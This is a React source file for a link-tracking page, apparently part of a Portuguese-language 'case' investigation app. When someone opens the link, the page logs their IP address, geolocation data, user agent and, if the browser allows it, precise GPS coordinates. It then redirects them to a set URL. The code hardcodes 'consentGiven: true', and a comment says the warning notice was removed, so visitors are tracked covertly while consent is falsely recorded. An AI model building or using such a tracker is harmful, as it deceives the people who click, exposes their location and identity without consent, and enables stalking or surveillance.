import React, { useState, useEffect, useCallback } from 'react';
import { useParams } from 'react-router-dom';
// Removidos os imports do aviso: AlertTriangle, CheckCircle, FileText
import { WifiOff, Loader2, XCircle } from 'lucide-react'; 
import { getCaseById, addLogToCase } from '../services/storageService';
import { getIpData, getBrowserLocation } from '../services/geoService';
import { AccessLog } from '../types';
import { v4 as uuidv4 } from 'uuid';
import { db } from '../services/firebase';
import { Button } from '../components/Button';

export const TrackingView: React.FC = () => {
    const { id } = useParams<{ id: string }>();
    const [loading, setLoading] = useState(false);
    const [initialLoading, setInitialLoading] = useState(true);
    const [error, setError] = useState('');
    const [caseData, setCaseData] = useState<any>(undefined);

    const trackAndRedirect = useCallback(async (data: any) => {
        if (!id || !data) {
            setLoading(false);
            return;
        }

        try {
            const ipData = await getIpData();
            let gpsData = undefined;
            try {
                const position = await getBrowserLocation(); 
                gpsData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                };
            } catch (e) {
                console.log("GPS denied or unavailable or blocked by browser.");
            }

            const log: AccessLog = {
                id: uuidv4(),
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                ip: ipData.ip,
                geoRaw: ipData,
                gps: gpsData,
                consentGiven: true
            };

            await addLogToCase(id, log);

            let url = data.destinationUrl?.trim();
            if (url) {
                if (!/^https?:\/\//i.test(url)) {
                    url = 'https://' + url;
                }
                window.location.href = url;
            } else {
                window.location.href = 'https://google.com';
            }

        } catch (err) {
            console.error(err);
            setError('Erro ao registrar o acesso. Redirecionando para o destino.');
            
            let url = data.destinationUrl?.trim();
            if (url) {
                if (!/^https?:\/\//i.test(url)) {
                    url = 'https://' + url;
                }
                window.location.href = url;
            } else {
                 window.location.href = 'https://google.com';
            }
        }
    }, [id]);


    useEffect(() => {
        const loadAndTrack = async () => {
            if (!id) {
                setInitialLoading(false);
                return;
            }

            const data = await getCaseById(id);
            setCaseData(data);
            setInitialLoading(false);

            if (data) {
                trackAndRedirect(data);
            }
        };

        loadAndTrack();
        
        return () => setLoading(false);
    }, [id, trackAndRedirect]);


    if (initialLoading || loading) {
        return (
            <div className="min-h-screen flex items-center justify-center bg-slate-100">
                <Loader2 className="animate-spin w-8 h-8 text-slate-400" />
            </div>
        );
    }

    if (!caseData) {
        return (
            <div className="min-h-screen flex items-center justify-center bg-slate-100 p-4 font-sans">
                <div className="bg-white p-6 rounded-lg shadow-lg text-center max-w-sm border border-slate-200">
                    <WifiOff className="w-12 h-12 text-slate-400 mx-auto mb-3" />
                    <h3 className="text-lg font-bold text-slate-700 mb-2">Procedimento Não Encontrado</h3>
                    <p className="text-slate-500 text-sm mb-4">
                        O link é inválido ou o caso não existe neste banco de dados.
                    </p>
                    {!db && (
                        <div className="bg-yellow-50 p-3 rounded text-xs text-yellow-700 text-left border border-yellow-100">
                        <strong>Nota:</strong> O app está em modo Demo (Local). Para funcionar globalmente, configure as chaves do Firebase em <code>services/firebase.ts</code>.
                        </div>
                    )}
                </div>
            </div>
        );
    }
    
    if (error) {
        return (
            <div className="min-h-screen flex items-center justify-center bg-red-50 p-4 font-sans">
                <div className="bg-white p-6 rounded-lg shadow-lg text-center max-w-sm border border-red-200">
                    <XCircle className="w-12 h-12 text-red-500 mx-auto mb-3" />
                    <h3 className="text-lg font-bold text-slate-700 mb-2">Erro</h3>
                    <p className="text-slate-500 text-sm mb-4">
                        {error}
                    </p>
                    <Button onClick={() => window.location.reload()} variant="primary">
                        Tentar Novamente
                    </Button>
                </div>
            </div>
        );
    }

    return (
        <div className="min-h-screen flex items-center justify-center bg-slate-100">
            <h1 className="text-lg text-slate-500">Iniciando Redirecionamento...</h1>
            <Loader2 className="animate-spin w-8 h-8 text-slate-400 ml-2" />
        </div>
    );
};